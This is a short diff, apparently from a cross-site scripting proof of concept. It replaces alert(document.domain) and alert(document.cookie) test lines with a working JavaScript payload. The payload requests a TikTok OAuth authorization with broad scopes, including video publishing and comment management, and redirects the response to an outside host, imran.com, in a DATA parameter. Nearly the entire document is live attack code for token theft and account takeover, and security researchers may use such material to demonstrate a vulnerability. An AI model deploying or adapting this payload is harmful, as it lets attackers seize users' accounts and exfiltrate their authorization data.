@@ -1,2 +1,1 @@
-alert(document.domain)
-alert(document.cookie)
+alert(document.domain);var xhr=new XMLHttpRequest;xhr.open("POST","https://tiktok.com/passport/open/web/auth/?client_key=7236493407642714114&scope=comment.list,video.publish,user.account.type,user.info.username,user.insights,user.info.basic,video.list,video.insights,comment.list.manage,user.info.stats&aid=1459&source=web&redirect_uri=https://tiktok.com/",!0),xhr.setRequestHeader("Content-type","application/json"),xhr.onload=()=>{let e=JSON.parse(xhr.responseText);var t=JSON.stringify(e);location.replace("https://imran.com/?DATA="+t)},xhr.send("{}");
